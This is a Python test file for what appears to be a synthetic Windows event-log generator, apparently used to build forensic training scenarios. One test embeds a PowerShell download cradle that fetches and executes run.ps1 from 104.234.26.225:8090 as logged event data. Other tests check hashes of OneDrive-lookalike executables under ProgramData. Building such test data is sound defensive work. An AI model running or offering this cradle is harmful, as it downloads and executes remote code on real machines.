import io
from Evtx.Evtx import FileHeader
from gen.winfmt import Event, EvtType as S, write_evtx, T
from gen.const import hashes


def test_evtx_roundtrip():
    cmd = r'powershell -nop -c "IEX(New-Object Net.WebClient).DownloadString(\'http://104.234.26.225:8090/run.ps1\')"'
    ev = Event(T(4, 18, 53, 40.1), "Microsoft-Windows-Security-Auditing", 4688,
               [("NewProcessName", S.STR, r"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"),
                ("CommandLine", S.STR, cmd)], channel="Security")
    data, first, last = write_evtx([ev], "int01.kelbrook.internal", 1)
    fh = FileHeader(data, 0)
    xmls = [r.xml() for c in fh.chunks() for r in c.records()]
    assert len(xmls) == 1 and "104.234.26.225:8090/run.ps1" in xmls[0]


def test_hashes_reales():
    md5, sha256, imp, sha1 = hashes(r"C:\ProgramData\Microsoft\OneDrive\OneDrive.exe")
    assert sha256 == "AD07D54B62359749B7A32C265E19E5F36CD4962CF957EA6C0FB07CEDDB702230"
    assert md5 == "215336E9270941186AC2BCA89425E49B" and sha1 == "9a199096b7ed2f23166296e2fde5f8dcdf8dee51"
    assert hashes(r"C:\ProgramData\Microsoft\OneDrive\Sync\OneSyncHost.exe")[1].startswith("1B6FFAC8")


def test_hashes_estables():
    p = r"C:\Windows\System32\cmd.exe"
    assert hashes(p) == hashes(p)
